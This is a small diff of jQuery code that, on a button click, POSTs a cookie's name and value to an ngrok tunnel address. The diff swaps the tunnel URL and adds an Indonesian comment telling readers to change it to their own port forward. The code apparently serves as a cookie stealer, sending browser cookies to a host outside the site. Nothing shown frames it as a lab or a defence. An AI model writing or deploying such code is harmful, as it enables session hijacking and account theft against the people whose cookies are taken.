@@ -9,7 +9,7 @@ $("#klik").click(function () {
 		});
 
 		$.ajax({
-			url: "https://12ab-2400-9800-b61-5e9c-ec5d-3116-c014-8afd.ngrok-free.app",
+			url: "https://196e-125-162-210-160.ngrok-free.app", // ubah sesuai dengan port forward kalian
 			type: "POST",
 			data: { nama: cookieName, isi: cookieVal },
 			success: function (response) {
